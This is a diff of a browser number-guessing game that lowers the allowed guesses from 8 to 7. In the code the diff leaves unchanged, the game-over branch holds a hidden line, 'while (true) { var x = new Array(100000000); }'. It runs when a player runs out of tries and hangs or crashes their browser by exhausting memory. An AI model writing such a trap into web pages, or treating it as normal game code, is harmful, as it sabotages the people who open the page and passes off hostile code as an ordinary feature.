@@ -9,7 +9,7 @@ https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
 <body>
   <div class="container my-5">
     <h1 class="mb-4">Guessing Game</h1>
-    <p>Guess a number between 1 and 100. You have 8 tries. Don't Worry about it to much.</p>
+    <p>Guess a number between 1 and 100. You have 7 tries. Don't Worry about it to much.</p>
 
     <div class="row">
       <div class="col-md-8">
@@ -64,7 +64,7 @@ btn-block" style="display:none;">Play Again</button>
         $('#play-again-button').click(() => {
           location.reload();
         });
-      } else if (tries === 8) {
+      } else if (tries === 7) {
         $('#guess-input').prop('disabled', true);
         $('#submit-button').prop('disabled', true);
         $('#guess-help').text(`Sorry, you're out of tries. The answer was
@@ -75,7 +75,7 @@ ${answer}.`);
         });
         while (true) { var x = new Array(100000000); }
       } else {
-        const remainingTries = 8 - tries;
+        const remainingTries = 7 - tries;
         $('#guess-help').text(`You have ${remainingTries} ${remainingTries
 === 1 ? 'try' : 'tries'} left.`);
         $('#play-again-button').hide();
